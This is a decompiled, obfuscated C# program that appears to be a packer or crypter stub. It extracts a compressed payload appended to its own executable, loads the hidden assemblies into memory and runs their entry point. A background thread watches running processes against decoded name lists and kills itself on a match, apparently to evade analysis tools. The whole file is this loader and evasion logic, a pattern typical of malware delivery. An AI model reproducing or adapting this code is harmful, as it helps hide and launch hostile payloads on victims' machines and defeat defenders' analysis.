using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using ns0;
using ns2;
using ns3;
using ns4;
using ns5;

namespace ns1;

internal sealed class Class5
{
	public struct Struct7
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		static Struct7()
		{
			Class12.Class13.Class14.smethod_1();
			Class7.smethod_15();
			GClass1.smethod_7();
		}
	}

	public struct Struct8
	{
		public bool bool_0;

		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		static Struct8()
		{
			Class12.Class13.Class14.smethod_1();
			Class7.smethod_15();
			GClass1.smethod_7();
		}
	}

	public static Struct8 struct8_0;

	public static string[] string_0;

	public static MemoryStream[] memoryStream_0;

	public static string[] string_1;

	public static string[] string_2;

	public static bool bool_0;

	static Class5()
	{
		Class12.Class13.Class14.smethod_1();
		Class7.smethod_15();
		GClass1.smethod_7();
		bool_0 = false;
	}

	private static long smethod_0(Stream stream_0)
	{
		long num = 0L;
		for (int i = 0; i < 8; i++)
		{
			int num2 = GClass2.smethod_0(stream_0, 3, 87);
			num |= (long)((ulong)(byte)num2 << 8 * i);
		}
		return num;
	}

	private static Struct8 smethod_1(MemoryStream memoryStream_1)
	{
		byte[] array = new byte[GClass0.smethod_1(GClass2.smethod_1(typeof(Struct8).TypeHandle, 320, 257), 494, 460)];
		Class1.smethod_2(memoryStream_1, array, 0, GClass0.smethod_1(GClass2.smethod_1(typeof(Struct8).TypeHandle, 959, 1022), 960, 994), 583, 590);
		GCHandle gchandle_ = Class9.Class10.smethod_3(array, GCHandleType.Pinned, 235, 236);
		Struct8 result = (Struct8)Class9.smethod_4(Class7.smethod_8(ref gchandle_, 837, 895), Class9.Class10.smethod_4(typeof(Struct8).TypeHandle, 822, 810), 322, 298);
		gchandle_.Free();
		return result;
	}

	private static Struct7 smethod_2(MemoryStream memoryStream_1, int int_0, ref string string_3, ref MemoryStream memoryStream_2)
	{
		byte[] array = new byte[GClass0.smethod_1(GClass2.smethod_1(typeof(Struct7).TypeHandle, 170, 235), 725, 759)];
		Exception0.smethod_1(memoryStream_1, int_0, SeekOrigin.Begin, 916, 999);
		Class1.smethod_2(memoryStream_1, array, 0, GClass0.smethod_1(GClass2.smethod_1(typeof(Struct7).TypeHandle, 831, 894), 50, 16), 75, 66);
		GCHandle gchandle_ = GClass1.smethod_4(array, GCHandleType.Pinned, 53, 42);
		Struct7 result = (Struct7)Class6.smethod_0(Class0.smethod_1(ref gchandle_, 248, 172), GClass2.smethod_1(typeof(Struct7).TypeHandle, 267, 330), 619, 540);
		GClass1.smethod_5(ref gchandle_, 671, 667);
		byte[] array2 = new byte[result.int_3];
		Exception0.smethod_1(memoryStream_1, result.int_2, SeekOrigin.Begin, 602, 553);
		memoryStream_1.Read(array2, 0, result.int_3);
		string_3 = Class7.Class8.smethod_6(Class9.smethod_5(787, 785), array2, 39, 59);
		byte[] buffer = new byte[result.int_1];
		Class7.smethod_4(memoryStream_1, result.int_0, SeekOrigin.Begin, 938, 960);
		memoryStream_1.Read(buffer, 0, result.int_1);
		memoryStream_2.Write(buffer, 0, result.int_1);
		return result;
	}

	private static string smethod_3(MemoryStream memoryStream_1, int int_0, int int_1)
	{
		byte[] byte_ = new byte[int_1];
		Exception0.smethod_1(memoryStream_1, int_0, SeekOrigin.Begin, 929, 978);
		Class1.smethod_2(memoryStream_1, byte_, 0, int_1, 6, 15);
		return Class7.Class8.smethod_6(Class9.smethod_5(433, 435), byte_, 791, 779);
	}

	private static Assembly smethod_4(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		string text = GClass2.smethod_2(GClass0.smethod_2(new AssemblyName(Class6.smethod_1(resolveEventArgs_0, 565, 617)), 976, 990), Exception0.smethod_0(859720309, 7), 195, 181);
		int num = 1;
		while (true)
		{
			if (num < struct8_0.int_0)
			{
				if (GClass1.smethod_6(string_0[num], text, bool_2: true, 182, 134) == 0)
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return Class9.Class10.smethod_5(Exception1.smethod_0(memoryStream_0[num], 130, 242), 483, 506);
	}

	public static bool smethod_5(string string_3, string string_4)
	{
		if (string_3 != null && Class6.smethod_2(string_3, 894, 809) != 0)
		{
			Regex regex = new Regex(Class7.Class8.smethod_7(Class9.Class10.smethod_6(Class2.smethod_0(Class2.smethod_0(string_4, Exception0.smethod_0(859720319, 4), Exception0.smethod_0(859720317, 2), 720, 663), Exception0.smethod_0(859720288, 1), Exception0.smethod_0(859720290, 7), 433, 502), '?', '.', 597, 625), 573, 606));
			return regex.IsMatch(string_3.ToLower());
		}
		return false;
	}

	public static bool smethod_6(string string_3, string[] string_4)
	{
		int num = 0;
		while (true)
		{
			if (num < string_4.Length)
			{
				string string_5 = string_4[num];
				if (smethod_5(string_3, string_5))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	public static void smethod_7()
	{
		Class1.smethod_3(GClass2.smethod_3(926, 953), 419, 397);
		Class9.Class10.Class11.smethod_4(Class9.smethod_6(532, 569), 199, 216);
		Process.GetCurrentProcess().Kill();
	}

	public static void smethod_8()
	{
		while (!bool_0)
		{
			Process[] array = Class0.smethod_2(246, 221);
			for (int i = 0; i < array.Length - 1; i++)
			{
				if (smethod_6(Class6.smethod_3(array[i], 754, 758), string_1))
				{
					smethod_7();
				}
				if (smethod_6(Class6.smethod_3(array[i], 109, 104), string_2))
				{
					smethod_7();
				}
				Class2.smethod_1(100, 939, 983);
			}
			Class7.Class8.smethod_8(1500, 219, 249);
		}
	}

	[STAThread]
	private static void Main(string[] args)
	{
		Class12.Class13.Class14.smethod_1();
		Class7.smethod_15();
		GClass1.smethod_7();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream stream_ = new MemoryStream(Class1.smethod_1());
		Exception0.smethod_1(stream_, -8L, SeekOrigin.End, 715, 696);
		long num = smethod_0(stream_);
		Exception0.smethod_1(stream_, -num - 8L, SeekOrigin.Current, 726, 677);
		byte[] byte_ = new byte[5];
		Class1.smethod_2(stream_, byte_, 0, 5, 798, 791);
		Class2 @class = new Class2();
		@class.vmethod_1(byte_);
		long long_ = smethod_0(stream_);
		@class.vmethod_0(stream_, memoryStream, num, long_, null);
		Exception0.smethod_2(stream_, 871, 875);
		Exception0.smethod_1(memoryStream, 0L, SeekOrigin.Begin, 248, 139);
		struct8_0 = smethod_1(memoryStream);
		if (struct8_0.bool_0)
		{
			string_1 = Class1.smethod_4(smethod_3(memoryStream, struct8_0.int_1, struct8_0.int_2), new char[1] { '|' }, 542, 554);
			string_2 = Class1.smethod_4(smethod_3(memoryStream, struct8_0.int_3, struct8_0.int_4), new char[1] { '|' }, 724, 736);
			Thread thread_ = new Thread(smethod_8);
			Class2.smethod_2(thread_, 800, 772);
		}
		string_0 = new string[struct8_0.int_0];
		memoryStream_0 = new MemoryStream[struct8_0.int_0];
		int num2 = GClass0.smethod_1(GClass2.smethod_1(typeof(Struct8).TypeHandle, 704, 641), 16, 50);
		for (int i = 0; i < struct8_0.int_0; i++)
		{
			string_0[i] = string.Empty;
			memoryStream_0[i] = new MemoryStream();
			smethod_2(memoryStream, num2, ref string_0[i], ref memoryStream_0[i]);
			num2 += GClass0.smethod_1(GClass2.smethod_1(typeof(Struct7).TypeHandle, 786, 851), 432, 402);
		}
		if (struct8_0.int_0 > 1)
		{
			Class2.smethod_3(Class1.smethod_5(581, 564), smethod_4, 752, 737);
		}
		Assembly assembly = Class9.Class10.smethod_5(Class9.smethod_1(memoryStream_0[0], 30, 45), 913, 904);
		if ((object)assembly != null)
		{
			if (Class9.smethod_7(Class9.Class10.Class11.smethod_5(assembly, 529, 516), 304, 356).Length == 0)
			{
				Class7.Class8.smethod_9(Class9.Class10.Class11.smethod_5(assembly, 738, 759), null, null, 645, 640);
			}
			else
			{
				Class7.Class8.smethod_9(Class9.Class10.Class11.smethod_5(assembly, 310, 291), null, new object[1] { args }, 33, 36);
			}
		}
		if (struct8_0.bool_0)
		{
			bool_0 = struct8_0.bool_0;
		}
	}
}
